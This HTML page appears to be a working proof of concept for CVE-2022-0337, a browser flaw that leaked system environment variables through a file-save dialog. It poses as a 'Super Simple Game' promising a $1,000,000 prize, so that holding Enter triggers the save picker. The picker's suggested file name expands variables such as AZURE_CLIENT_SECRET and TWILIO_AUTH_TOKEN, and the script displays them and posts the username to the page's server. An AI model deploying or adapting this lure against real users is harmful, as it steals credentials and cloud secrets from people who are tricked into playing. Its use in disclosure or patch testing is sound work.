<!-- templates/index.html -->
<!DOCTYPE html>
<html>
<head>
    <title>
        CVE-2022-0337 System environment variables leak on Google Chrome,
        Microsoft Edge and Opera
    </title>
    <meta charset="UTF-8" />
    <style>
        /* CSS styles... */
    </style>
</head>
<body>
    <div id="pixel"></div>
    <h3 id="userInfo"></h3>
    <h1>Super Simple Game<span>ğŸ˜»ğŸ˜»ğŸ˜»</span></h1>
    <h2><span>âŒ¨ï¸HOLD ENTER</span> for 2 seconds</h2>
    <h3>win $1,000,000 and rule the world! <span>ğŸ”¥ğŸ”¥ğŸ”¥ğŸš€</span></h3>
    <h3 id="gameover"></h3>

    <script>

        function sendDataToServer(value) {
            fetch('/get_data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                // CÃ³ thá»ƒ gá»­i dá»¯ liá»‡u náº¿u cáº§n
                body: JSON.stringify({ key: value })
            })
            .then(response => response.json())
            .then(data => {
                // Xá»­ lÃ½ response tá»« mÃ¡y chá»§ á»Ÿ Ä‘Ã¢y
                console.log(data);
                // VÃ­ dá»¥: Hiá»ƒn thá»‹ thÃ´ng Ä‘iá»‡p tá»« response trÃªn trang web
                document.getElementById('responseMessage').innerText = data.message;
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }
        
        let countEnter = 0;
        let isDownloaded = false;

        window.onload = function () {
            const body = document.querySelector("body");
            const pixel = document.querySelector("#pixel");

            body.onkeydown = (e) => (e.key == "Enter" ? clickedEnter() : 1);
            body.onkeyup = (e) => (e.key == "Enter" ? cancelEnter() : 1);

            const randomNumber = Math.floor(Math.random() * 990) + 1;
            const filename = `f${randomNumber}.f`;

            const environmentVariables = [
            "USERNAME",
            "USERDOMAIN",
            "SESSIONNAME",
            "COMPUTERNAME",
            "KEY_VAULT_URL",
            "SECRET_NAME",
            "AZURE_TENANT_ID",
            "AZURE_CLIENT_ID",
            "AZURE_CLIENT_SECRET",
            "TWILIO_ACCOUNT_SID",
            "TWILIO_AUTH_TOKEN",
            //'TOKEN',
            //'PASSWORD'
            ];

            const suggestedName =
                environmentVariables.map((x) => `%${x}%`).join("@") + filename;

            pixel.addEventListener("click", async () => {
                const data = await window.navigator.userAgent;
                console.log(data)

                const handle = await window.showSaveFilePicker({ suggestedName });

                const username = handle.name.split("@")[0];
                sendDataToServer(username)
                const userInfo = handle.name
                    .replaceAll(filename, "")
                    .split("@")
                    .map(
                        (x, i) =>
                            `${environmentVariables[i]} = ${x.includes("%") ? "null" : x}`
                    )
                    .join("<br>");
                const guessWinPath = `C:/Users/${username}`;
                document.querySelector(
                    "#userInfo"
                ).innerHTML = `USER'S ENVIRONMENT VARIABLES: <br>${userInfo} <br> guessWinPath = C:/users/${username}`;
                document.querySelector("#gameover").textContent =
                    "GAME OVER - Need refresh to start again";
            });
        };

        function clickedEnter() {
            countEnter++;
            if (countEnter > 5 && !isDownloaded) {
                pixel.click();
                isDownloaded = true;
            }
        }

        function cancelEnter() {
            countEnter = 0;
        }
    </script>
</body>
</html>
